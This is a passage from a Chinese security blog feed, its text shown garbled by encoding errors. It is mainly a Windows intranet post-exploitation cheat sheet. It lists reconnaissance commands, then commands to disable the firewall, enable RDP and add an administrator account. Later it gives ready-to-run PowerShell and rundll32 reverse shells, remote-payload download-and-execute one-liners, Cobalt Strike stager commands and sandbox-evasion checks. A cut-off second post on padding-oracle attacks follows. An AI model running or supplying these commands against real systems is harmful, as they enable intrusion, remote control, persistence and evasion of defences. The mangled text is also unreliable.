src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010605609.png" alt="image-20210217010605609"></p><h3 id="ç”¨æˆ·ç›¸å…³"><a href="#ç”¨æˆ·ç›¸å…³" class="headerlink" title="ç”¨æˆ·ç›¸å…³"></a>ç”¨æˆ·ç›¸å…³</h3><p>net user æŸ¥çœ‹æ‰€æœ‰ç”¨æˆ·<br>net localgroup administrators è·å–æœ¬åœ°ç®¡ç†å‘˜ä¿¡æ¯</p><h3 id="æŸ¥çœ‹ç«¯å£åˆ—è¡¨"><a href="#æŸ¥çœ‹ç«¯å£åˆ—è¡¨" class="headerlink" title="æŸ¥çœ‹ç«¯å£åˆ—è¡¨"></a>æŸ¥çœ‹ç«¯å£åˆ—è¡¨</h3><p>netstat -ano</p><h3 id="æŸ¥çœ‹å·²æ‰“è¡¥ä¸"><a href="#æŸ¥çœ‹å·²æ‰“è¡¥ä¸" class="headerlink" title="æŸ¥çœ‹å·²æ‰“è¡¥ä¸"></a>æŸ¥çœ‹å·²æ‰“è¡¥ä¸</h3><p>wmic qfe get Caption,Description,HotFixID,InstalledOn</p><h3 id="æŸ¥çœ‹å…±äº«åˆ—è¡¨"><a href="#æŸ¥çœ‹å…±äº«åˆ—è¡¨" class="headerlink" title="æŸ¥çœ‹å…±äº«åˆ—è¡¨"></a>æŸ¥çœ‹å…±äº«åˆ—è¡¨</h3><p>net share æŸ¥çœ‹æœ¬æœºå…±äº«åˆ—è¡¨å’Œå¯è®¿é—®çš„åŸŸå…±äº«åˆ—è¡¨<br>wmic share get name,path,status æŸ¥æ‰¾å…±äº«åˆ—è¡¨</p><p><img src="http://www.const27.com/wp-content/uploads/2020/08/image-7.png" alt="img"></p><h3 id="è·¯ç”±è¡¨å’Œarpé«˜é€Ÿç¼“å­˜è¡¨"><a href="#è·¯ç”±è¡¨å’Œarpé«˜é€Ÿç¼“å­˜è¡¨" class="headerlink" title="è·¯ç”±è¡¨å’Œarpé«˜é€Ÿç¼“å­˜è¡¨"></a>è·¯ç”±è¡¨å’Œarpé«˜é€Ÿç¼“å­˜è¡¨</h3><p>route print è·¯ç”±è¡¨<br>arp -a arpé«˜é€Ÿç¼“å­˜è¡¨</p><h3 id="é˜²ç«å¢™"><a href="#é˜²ç«å¢™" class="headerlink" title="é˜²ç«å¢™"></a>é˜²ç«å¢™</h3><p>netsh firewall set opmode disable å…³é—­é˜²ç«å¢™(Windows Server 2003 ä»¥å‰çš„ç‰ˆæœ¬)</p><p>netsh advfirewall set allprofiles state off å…³é—­é˜²ç«å¢™(Windows Server 2003 ä»¥åçš„ç‰ˆæœ¬)</p><p>netsh firewall show config æŸ¥çœ‹é˜²ç«å¢™é…ç½®<br>å¦‚æœä¸Šé¢çš„å‘½ä»¤è¢«å¼ƒç”¨ï¼Œåˆ™ä½¿ç”¨<br>netsh advfirewall firewall show rule name=all</p><p>æ ¹æ®å‚è€ƒï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªwmicä¸€é”®è·å–æœ¬æœºä¿¡æ¯<a href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar">http://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p><h3 id="æƒé™æŸ¥çœ‹"><a href="#æƒé™æŸ¥çœ‹" class="headerlink" title="æƒé™æŸ¥çœ‹"></a>æƒé™æŸ¥çœ‹</h3><p>whoami /all æŸ¥çœ‹è‡ªå·±çš„è¯¦ç»†æƒé™<br>net user xxx /domain æŸ¥çœ‹åŸŸå†…æŒ‡å®šç”¨æˆ·çš„æƒé™</p><h3 id="åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ"><a href="#åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ" class="headerlink" title="åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ"></a>åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ</h3><p>.net time /domain è‹¥å‡ºç°ä»¥ä¸‹æƒ…å†µåˆ™ä¸å­˜åœ¨åŸŸ</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010613612.png" alt="image-20210217010613612"></p><p>è‹¥æ˜¯æŠ¥é”™ï¼šå‘ç”Ÿç³»ç»Ÿé”™è¯¯5ï¼Œåˆ™å­˜åœ¨åŸŸï¼Œä½†è¯¥ç”¨æˆ·ä¸æ˜¯åŸŸç”¨æˆ·</p><p>è‹¥æ˜¯ä»¥ä¸‹æƒ…å†µåˆ™è¯´æ˜å­˜åœ¨åŸŸä¸”å·²ç»åœ¨åŸŸä¸­</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010619330.png" alt="image-20210217010619330"></p><h3 id="æŸ¥çœ‹åŸŸçš„åå­—"><a href="#æŸ¥çœ‹åŸŸçš„åå­—" class="headerlink" title="æŸ¥çœ‹åŸŸçš„åå­—"></a>æŸ¥çœ‹åŸŸçš„åå­—</h3><p>net config workstation</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010626107.png" alt="image-20210217010626107"></p><p>nslookup -type=srv _ldap._tcp</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210217010633461.png" alt="image-20210217010633461"></p><p>è¿™ä¸ªå¾ˆçˆ½ï¼ŒåŸŸæ§ä¸»æœºåå’ŒIPä¸€å—å¼„å‡ºæ¥äº†</p><h3 id="æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº"><a href="#æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº" class="headerlink" title="æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº"></a>æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº</h3><p>1.ä½¿ç”¨å·¥å…· nbtscan <a href="http://www.unixwiz.net/tools/nbtscan.html">http://www.unixwiz.net/tools/nbtscan.html</a></p><p>2.æŸ¥çœ‹arpé«˜é€Ÿç¼“å­˜è¡¨</p><p>arp -a</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/0X@7L2W0IVA%60NKX1AM9JZKB.png" alt="img"></p><p>3.ICMPåè®®æ¢æµ‹ï¼ˆé€ä¸ªpingï¼‰</p><p>è¿™ä¸ªè´¼æ…¢ï¼Œä½†æ˜¯ä¸ç”¨ä¸‹è½½å…¶ä»–åº”ç”¨</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL&quot;</span><br></pre></td></tr></table></figure><p>4.nmapç›´æ¥å¼€æ‰«</p><p>5.meterpreterä¼šè¯ä¸­æ‰§è¡Œ run windows/gather/enum_ad_computers</p><h3 id="æ‰«æåŸŸå†…å¼€æ”¾ç«¯å£"><a href="#æ‰«æåŸŸå†…å¼€æ”¾ç«¯å£" class="headerlink" title="æ‰«æåŸŸå†…å¼€æ”¾ç«¯å£"></a>æ‰«æåŸŸå†…å¼€æ”¾ç«¯å£</h3><p>1.nmap</p><p>nmap 192.168.1.0/24</p><p>2.å·¥å…· Sæ‰«æå™¨</p><p>3.è‡ªå†™è„šæœ¬</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#python3 æ…¢çš„ä¸€æ‰¹</span><br><span class="line">import socket</span><br><span class="line"> </span><br><span class="line">def get_ip_status(ip,port):</span><br><span class="line">    server &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    try:</span><br><span class="line">        server.connect((ip,port))</span><br><span class="line">        print(&#39;&#123;0&#125; port &#123;1&#125; is open&#39;.format(ip, port))</span><br><span class="line">    except Exception as err:</span><br><span class="line">        print(&#39;&#123;0&#125; port &#123;1&#125; is not open&#39;.format(ip,port))</span><br><span class="line">    finally:</span><br><span class="line">        server.close()</span><br><span class="line"> </span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    host &#x3D; &#39;172.16.0.198&#39;</span><br><span class="line">    for port in range(20,100):</span><br><span class="line">        get_ip_status(host,port)</span><br></pre></td></tr></table></figure><h3 id="åŸŸå†…åŸºæœ¬ä¿¡æ¯"><a href="#åŸŸå†…åŸºæœ¬ä¿¡æ¯" class="headerlink" title="åŸŸå†…åŸºæœ¬ä¿¡æ¯"></a>åŸŸå†…åŸºæœ¬ä¿¡æ¯</h3><p>net group â€œdomain computersâ€ /domain æŸ¥è¯¢æ‰€æœ‰åŸŸæˆå‘˜è®¡ç®—æœºåˆ—è¡¨<br>net view /domain:HACHE æŸ¥è¯¢åŸŸå†…æ‰€æœ‰ä¸»æœº<br>net accounts /domain è·å–åŸŸå¯†ç ä¿¡æ¯<br>nltest /domain_trusts è·å–åŸŸä¿¡ä»»ä¿¡æ¯<br>nltest /DCLIST:hacke æŸ¥çœ‹åŸŸæ§åˆ¶å™¨æœºå™¨å<br>Nslookup -type=SRV_ldap._tcp æŸ¥çœ‹åŸŸæ§åˆ¶å™¨çš„ä¸»æœºå</p><h3 id="åŸŸç”¨æˆ·ä¿¡æ¯æ”¶é›†"><a href="#åŸŸç”¨æˆ·ä¿¡æ¯æ”¶é›†" class="headerlink" title="åŸŸç”¨æˆ·ä¿¡æ¯æ”¶é›†"></a>åŸŸç”¨æˆ·ä¿¡æ¯æ”¶é›†</h3><p>net user /domain å‘åŸŸæ§åˆ¶å™¨æŸ¥è¯¢åŸŸå†…ç”¨æˆ·åˆ—è¡¨<br>wmic useraccount get /all è·å–åŸŸå†…ç”¨æˆ·è¯¦ç»†ä¿¡æ¯<br>net localgroup administrators æŸ¥è¯¢æœ¬åœ°ç®¡ç†å‘˜ç”¨æˆ·<br>net group â€œdomain adminsâ€ /domain æŸ¥è¯¢åŸŸç®¡ç†å‘˜ç”¨æˆ·<br>net group â€œEnterprise adminsâ€ /domain æŸ¥è¯¢ç®¡ç†å‘˜ç”¨æˆ·ç»„</p><h3 id="æœ¬æœºwmicæŸ¥æ€è½¯"><a href="#æœ¬æœºwmicæŸ¥æ€è½¯" class="headerlink" title="æœ¬æœºwmicæŸ¥æ€è½¯"></a>æœ¬æœºwmicæŸ¥æ€è½¯</h3><p><code>WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List</code><br>or</p><p>WMIC /namespace:\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe</p><h3 id="å¼€3389"><a href="#å¼€3389" class="headerlink" title="å¼€3389"></a>å¼€3389</h3><p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminalâ€ â€œServer /v fDenyTSConnections /t REG_DWORD /d 0 /f</p><h3 id="ç”¨æˆ·å¢åˆ æ”¹æŸ¥"><a href="#ç”¨æˆ·å¢åˆ æ”¹æŸ¥" class="headerlink" title="ç”¨æˆ·å¢åˆ æ”¹æŸ¥"></a>ç”¨æˆ·å¢åˆ æ”¹æŸ¥</h3><p>net user username password /add åŠ ç”¨æˆ·</p><p>net localgroup administrators username /add æ·»åŠ XXåˆ°ç®¡ç†å‘˜è´¦æˆ·</p><h3 id="ä¸€äº›å–œæ¬¢ç”¨çš„"><a href="#ä¸€äº›å–œæ¬¢ç”¨çš„" class="headerlink" title="ä¸€äº›å–œæ¬¢ç”¨çš„"></a>ä¸€äº›å–œæ¬¢ç”¨çš„</h3><p>Windows åå¼¹shell</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;); powercat -c 192.168.1.4 -p 9999 -e cmd</span><br><span class="line"></span><br><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;samratashok&#x2F;nishang&#x2F;9a3c747bcf535ef82dc4c5c66aac36db47c2afde&#x2F;Shells&#x2F;Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.203.140 -port 6666</span><br><span class="line"></span><br><span class="line">NISHANGé‡Œé¢æŠ çš„</span><br><span class="line">ï¼ˆä¹ä¸ç‰ˆï¼‰</span><br><span class="line">$sm&#x3D;(New-Object Net.Sockets.TCPClient(&quot;192.168.254.1&quot;,55555)).GetStream();[byte[]]$bt&#x3D;0..65535|%&#123;0&#125;;while(($i&#x3D;$sm.Read($bt,0,$bt.Length)) -ne 0)&#123;;$d&#x3D;(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st&#x3D;([text.encoding]::ASCII).GetBytes((iex $d 2&gt;&amp;1));$sm.Write($st,0,$st.Length)&#125; </span><br><span class="line">ï¼ˆè±ªåç‰ˆï¼‰</span><br><span class="line">$client &#x3D; New-Object System.Net.Sockets.TCPClient(&quot;192.168.254.1&quot;,4444);$stream &#x3D; $client.GetStream();[byte[]]$bytes &#x3D; 0..65535|%&#123;0&#125;;while(($i &#x3D; $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data &#x3D; (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback &#x3D; (iex $data 2&gt;&amp;1 | Out-String );$sendback2  &#x3D; $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte &#x3D; ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()</span><br><span class="line"></span><br><span class="line">(cmdä¸“ç‰ˆ)</span><br><span class="line">rundll32.exe javascript:&quot;&quot;\..\mshtml,RunHTMLApplication &quot;&quot;;document.write();r&#x3D;new%20ActiveXObject(&quot;&quot;WScript.Shell&quot;&quot;).run(&quot;&quot;powershell -w h -ep bypass &#96;$sm&#x3D;(New-Object Net.Sockets.TCPClient(&#39;$IPAddress&#39;,$Port)).GetStream();[byte[]]&#96;$bt&#x3D;0..65535|%&#123;0&#125;;while((&#96;$i&#x3D;&#96;$sm.Read(&#96;$bt, 0, &#96;$bt.Length)) -ne 0)&#123;;&#96;$d&#x3D;(New-Object Text.ASCIIEncoding).GetString(&#96;$bt,0, &#96;$i);&#96;$sb&#x3D;(iex &#96;$d 2&gt;&amp;1 | Out-String );&#96;$sb2&#x3D;&#96;$sb + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;&#96;$sb&#x3D;([text.encoding]::UTF8).GetBytes(&#96;$sb2);&#96;$sm.Write(&#96;$sb,0,&#96;$sb.Length);&#96;$sm.Flush()&#125;&quot;&quot;,0,true);</span><br></pre></td></tr></table></figure><p>wmic æŸ¥æ€è½¯</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WMIC &#x2F;namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe</span><br><span class="line"></span><br><span class="line">WMIC &#x2F;Node:localhost &#x2F;Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName &#x2F;Format:List</span><br></pre></td></tr></table></figure><p>å¼€3389</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br><span class="line"></span><br><span class="line">wmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1</span><br><span class="line"></span><br><span class="line">wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName &#x3D;&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 0</span><br></pre></td></tr></table></figure><p>å¸¸è§æ€è½¯è¿›ç¨‹å<br><a href="https://blog.csdn.net/weixin_39997829/article/details/92666552">https://blog.csdn.net/weixin_39997829/article/details/92666552</a></p><p>cmdä¸‹è½½</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;www.xx.com&#x2F;code.jpg c:\users\sdyp\desktop\ff.jpg</span><br><span class="line"></span><br><span class="line">C:\Temp&gt;certutil.exe -urlcache -split -f &quot;https:&#x2F;&#x2F;hackers.home&#x2F;badcontent.txt&quot; bad.txt</span><br><span class="line">C:\Temp&gt;certutil.exe -decode bad.txt bad.exe</span><br></pre></td></tr></table></figure><p>è·å–ç›˜ç¬¦</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic logicaldisk where drivetype&#x3D;3 get deviceid</span><br></pre></td></tr></table></figure><h3 id="ps-cs-ä¸Šçº¿"><a href="#ps-cs-ä¸Šçº¿" class="headerlink" title="ps cs ä¸Šçº¿"></a>ps cs ä¸Šçº¿</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell.exe -c IEX((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;xxx&#x2F;a.ps1&#39;))</span><br><span class="line"></span><br><span class="line">powershell -exec bypass -c &quot;(New-Object Net.WebClient).Proxy.Credentials&#x3D;[Net.CredentialCache]::DefaultNetworkCredentials;iwr(&#39;http:&#x2F;&#x2F;webserver&#x2F;payload.ps1&#39;)|iex&quot;</span><br><span class="line"></span><br><span class="line">powershell -exec bypass -f \\webdavserver\folder\payload.ps1   (smb)</span><br></pre></td></tr></table></figure><h3 id="æŸ¥çœ‹å¼€æœºè‡ªå¯"><a href="#æŸ¥çœ‹å¼€æœºè‡ªå¯" class="headerlink" title="æŸ¥çœ‹å¼€æœºè‡ªå¯"></a>æŸ¥çœ‹å¼€æœºè‡ªå¯</h3><p>Reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</p><p>Reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</p><h3 id="è·å–é¥æµ‹ä»»åŠ¡"><a href="#è·å–é¥æµ‹ä»»åŠ¡" class="headerlink" title="è·å–é¥æµ‹ä»»åŠ¡"></a>è·å–é¥æµ‹ä»»åŠ¡</h3><p>Reg query <strong>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\Appraiser</strong></p><h3 id="åç—…æ¯’æ£€æµ‹"><a href="#åç—…æ¯’æ£€æµ‹" class="headerlink" title="åç—…æ¯’æ£€æµ‹"></a>åç—…æ¯’æ£€æµ‹</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct</span><br></pre></td></tr></table></figure><p>æ ¹æ®ç³»ç»Ÿçš„ä¸åŒï¼Œåç—…æ¯’è½¯ä»¶é€šå¸¸ä¼šWMIä¸­æ³¨å†Œä¸º<code>AntiVirusProduct</code>ï¼Œä¿å­˜åœ¨<code>root\SecurityCenter</code>æˆ–<code>root\SecurityCenter2</code>å‘½åç©ºé—´ä¸­ã€‚</p><h3 id="ç®€å•çš„æ²™ç›’-amp-è™šæ‹Ÿæœºæ£€æµ‹"><a href="#ç®€å•çš„æ²™ç›’-amp-è™šæ‹Ÿæœºæ£€æµ‹" class="headerlink" title="ç®€å•çš„æ²™ç›’&amp;è™šæ‹Ÿæœºæ£€æµ‹"></a>ç®€å•çš„æ²™ç›’&amp;è™šæ‹Ÿæœºæ£€æµ‹</h3><p>æ²™ç›’å¾€å¾€æ˜¯å•æ ¸ä¸”å†…å­˜å°äº2gï¼Œå¯ä»¥ä»¥æ­¤ä¸ºå‡­æ®æ£€æµ‹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-WmiObject -Class Win32_ComputerSystem NumberOfLogicalProcessors,TotalPhysicalMemory</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210802132941979.png" alt="image-20210802132941979"></p><p>VMWAREè™šæ‹Ÿæœºå¦‚ä»Šç”¨çš„æ¯”è¾ƒå¤šï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ£€æµ‹è¿›ç¨‹ä¸­æ˜¯å¦å­˜åœ¨vmtoolsdä»¥åŠBIOSå±æ€§é‡Œæ˜¯å¦æœ‰VMWAREå­—æ ·æ¥åˆ¤æ–­æ˜¯å¦æ˜¯VMWAREè™šæ‹Ÿæœº</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-WmiObject Win32_BIOS -Filter &#39;SerialNumber Like &quot;%VMware%&quot;&#39;</span><br><span class="line">Get-WmiObject Win32_NetworkAdapter -Filter &#39;Manufacturer LIKE &quot;%VMware%&quot; OR Name LIKE &quot;%VMware%&quot;&#39;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æ­£æ–‡&quot;&gt;&lt;a href=&quot;#æ­£æ–‡&quot; class=&quot;headerlink&quot; title=&quot;æ­£æ–‡&quot;&gt;&lt;/a&gt;æ­£æ–‡&lt;/h1&gt;&lt;p&gt;å‰å‡ å¤©é¢è¯•çš„æ—¶å€™è¢«å¸ˆå‚…é—®åˆ°äº†è¿™ä¸ªé—®é¢˜ï¼Œå½“æ—¶ä¸æ˜¯å¾ˆä¼šï¼Œç°åœ¨æ¥å­¦å­¦&lt;/p&gt;
&lt;h3 id=&quot;æŸ¥è¯¢ç½‘ç»œé…ç½®ä¿¡æ¯&quot;&gt;&lt;a href=&quot;#æŸ¥è¯¢ç½‘ç»œé…ç½®</summary>
      
    
    
    
    
    <category term="å†…ç½‘æ¸—é€ä¸æƒé™ç»´æŒ" scheme="http://const27.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>WEBä¸­å¸¸è§çš„å‡ ç±»å¯†ç å­¦æ”»å‡»æ–¹å¼</title>
    <link href="http://const27.com/2021/06/28/WEB%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%87%A0%E7%B1%BB%E5%AF%86%E7%A0%81%E5%AD%A6%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/"/>
    <id>http://const27.com/2021/06/28/WEB%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E5%87%A0%E7%B1%BB%E5%AF%86%E7%A0%81%E5%AD%A6%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</id>
    <published>2021-06-28T13:52:26.915Z</published>
    <updated>2021-06-28T13:42:56.111Z</updated>
    
    <content type="html"><![CDATA[<p>å‚è€ƒ: <a href="https://www.freebuf.com/articles/database/151167.html">https://www.freebuf.com/articles/database/151167.html</a><br><a href="https://www.jianshu.com/p/7f171477a603">https://www.jianshu.com/p/7f171477a603</a></p><p>å› ä¸ºæ˜¯æ¶‰åŠå¯†ç å­¦çš„ä¸œè¥¿ï¼Œæ‰€ä»¥çœ‹çš„æˆ‘å¤´å¤§ï¼Œè®°å½•ä¸€ä¸‹å§ã€‚</p><h1 id="Padding-oracle-attack-ä¸CBCç¿»è½¬å­—èŠ‚æ”»å‡»"><a href="#Padding-oracle-attack-ä¸CBCç¿»è½¬å­—èŠ‚æ”»å‡»" class="headerlink" title="Padding oracle attack ä¸CBCç¿»è½¬å­—èŠ‚æ”»å‡»"></a>Padding oracle attack ä¸CBCç¿»è½¬å­—èŠ‚æ”»å‡»</h1><h2 id="å¼‚æˆ–ï¼ˆXORï¼‰"><a href="#å¼‚æˆ–ï¼ˆXORï¼‰" class="headerlink" title="å¼‚æˆ–ï¼ˆXORï¼‰"></a>å¼‚æˆ–ï¼ˆXORï¼‰</h2><p>ä½•ä¸ºå¼‚æˆ–?<br>å¼‚æˆ–æ˜¯ä¸€ç§è¿ç®—æ–¹æ³•ï¼Œç®€è¦æ¦‚æ‹¬å°±æ˜¯åŒå‡å¼‚çœŸ</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">true xor true &#x3D; false; true xor false &#x3D; true;</span><br><span class="line"></span><br><span class="line">åœ¨äºŒè¿›åˆ¶ä¸­:</span><br><span class="line">011 xor 110 &#x3D; 101; äºŒè¿›åˆ¶æ•°æ¯ä½æ•°åˆ†åˆ«è¿›è¡Œxorè¿ç®—</span><br><span class="line">ä¸Šé¢ç®—å¼çš„è¿ç®—æ­¥éª¤æ˜¯è¿™æ ·çš„ 0 xor 1 &#x3D; 1;1 xor 1 &#x3D; 0;1 xor 0&#x3D;1</span><br><span class="line">ç„¶åæŠŠè¿ç®—ç»“æœå†™åœ¨ä¸€èµ·å°±æ˜¯101äº†</span><br><span class="line"></span><br><span class="line">åœ¨æ›´é«˜çš„è¿›åˆ¶ä¸­:</span><br><span class="line">ä»¥åè¿›åˆ¶ä¸ºä¾‹: 65 xor 42 &#x3D; 107; åŸç†å°±æ˜¯æŠŠåè¿›åˆ¶æ•°å­—å…ˆå˜ä¸ºäºŒè¿›åˆ¶æ•°è¿›è¡Œå¼‚æˆ–ï¼Œå†å°†å¼‚æˆ–å¾—åˆ°çš„äºŒè¿›åˆ¶æ•°ç»“æœå˜ä¸ºåè¿›åˆ¶æ•°</span><br><span class="line"></span><br><span class="line">åœ¨å­—ç¬¦ä¸­:</span><br><span class="line">å¯¹å­—ç¬¦è¿›è¡Œå¼‚æˆ–è¿ç®—å…¶å®å°±æ˜¯å¯¹å­—ç¬¦çš„asciiç è¿›è¡Œå¼‚æˆ–è®¡ç®—ï¼Œè®¡ç®—å¾—åˆ°çš„ç»“æœè§†ä½œæ–°çš„ä¸€ä¸ªasciiç å†å°†å…¶è½¬æ¢ä¸ºå­—ç¬¦ã€‚</span><br></pre></td></tr></table></figure><p>xorè¿˜æœ‰ä¸€ä¸ªæ€§è´¨ï¼Œå°±æ˜¯<br>å·²çŸ¥ a xor b = c é‚£ä¹ˆ<br>b xor c =a; a xor c = b.å³æ»¡è¶³å¼‚æˆ–è¿ç®—é‡Œåªéœ€çŸ¥é“ä»»æ„ä¸¤ä¸ªæ•°å°±èƒ½å¾—åˆ°å¦ä¸€ä¸ªæ•°ã€‚</p><h2 id="CBCæ¨¡å¼"><a href="#CBCæ¨¡å¼" class="headerlink" title="CBCæ¨¡å¼"></a>CBCæ¨¡å¼</h2><p>CBCæ˜¯ä¸€ç§åŠ å¯†æ¨¡å‹ï¼Œé‡‡ç”¨çš„æ˜¯åˆ†ç»„é“¾æ¥æ¨¡å¼ã€‚æŠŠæ˜æ–‡åˆ†ä¸ºä¸€ç»„ä¸€ç»„è¿›è¡ŒåŠ å¯†</p><p><img src="https://image.3001.net/images/20171018/15083333186437.png!small" alt="Padding oracle attackè¯¦ç»†è§£æ"></p><p>ä¸Šå›¾æ˜¯CBCåŠ å¯†æµç¨‹ã€‚æœ€å¼€å§‹ä¸€ä¸ªç‰¹åˆ«åˆ†ç»„IVå»å’Œç¬¬ä¸€æ®µå¯†æ–‡XORï¼Œå¾—åˆ°çš„ç»“æœè¢«å¯†é’¥åŠ å¯†ï¼ŒåŠ å¯†å¾—åˆ°è¯¥ç»„çš„å¯†æ–‡ï¼ŒåŒæ—¶è¿™ä¸ªå¯†æ–‡ä¼šå……å½“æœ€å¼€å§‹çš„ç‰¹åˆ«åˆ†ç»„IVçš„ä½œç”¨å»å‚ä¸ä¸‹ä¸€ç»„çš„åŠ å¯†ï¼Œä»¥æ­¤ç±»æ¨ã€‚</p><p>CBCçš„æ¯ä¸€ä¸ªåˆ†ç»„çš„åŠ å¯†ç»“æœéƒ½å¯ä»¥å½±å“åˆ°ä¸‹ä¸€ä¸ªåˆ†ç»„çš„åŠ å¯†ç»“æœï¼Œ ä½¿åŸæœ¬ç‹¬ç«‹çš„åˆ†ç»„å¯†ç åŠ å¯†è¿‡ç¨‹å½¢æˆè¿­ä»£ ï¼Œ è¿™å¯ä»¥å¼ºåŒ–åŠ å¯†ç®—æ³•çš„â€æ•æ„Ÿæ€§â€ï¼Œå³å®ç°æ‰€è°“çš„â€é›ªå´©æ•ˆåº”â€ï¼Œåœ¨é¦™æµ“ç†è®ºä¸­è¿™å°±æ˜¯â€æ‰°ä¹±åŸåˆ™â€ ã€‚</p><p>CBCåªæ˜¯ä¸€ç§æ¨¡å¼ï¼Œå®ƒç»å¸¸æŠŠaesæˆ–desä½œä¸ºåŠ å¯†ä½¿ç”¨çš„ç®—æ³•ã€‚ DESåˆ†ç»„é•¿åº¦æ˜¯å…«å­—èŠ‚è€ŒAESåˆ†ç»„é•¿åº¦æ˜¯åå…­å­—èŠ‚ ã€‚</p><p>æ¥ä¸‹æ¥æ˜¯CBCè§£å¯†</p><p><img src="https://image.3001.net/images/20171018/15083355296698.png!small" alt="Padding oracle attackè¯¦ç»†è§£æ"></p><p>é¡ºåºä¾æ—§æ˜¯ä»å·¦åˆ°å³ï¼Œç¬¬ä¸€ç»„å¯†æ–‡è¢«KEYè§£å¯†åä¸IV xorå¾—åˆ°ç¬¬ä¸€ç»„æ˜æ–‡ï¼ŒåŒæ—¶ç¬¬ä¸€ç»„å¯†æ–‡å‚ä¸ä¸‹ä¸€ç»„çš„è§£å¯†å……å½“IVä½œç”¨ã€‚</p><h2 id="PKCS-5"><a href="#PKCS-5" class="headerlink" title="PKCS #5"></a><strong>PKCS #5</strong></h2><p>ç«Ÿç„¶CBCæ¨¡å¼æ¶‰åŠåˆ°åˆ†ç»„ï¼Œé‚£ä¹ˆå°±ä¼šå‡ºç°æœ€åä¸€ç»„å­—èŠ‚æ²¡æœ‰è¢«å æ»¡çš„æƒ…å†µã€‚<br>æ¯”å¦‚åŸæœ¬ä¸€ä¸ªåˆ†ç»„æ˜¯8å­—èŠ‚ï¼Œæˆ‘ä»¬æœ‰15ä¸ªå­—èŠ‚çš„æ˜æ–‡éœ€è¦è¢«åŠ 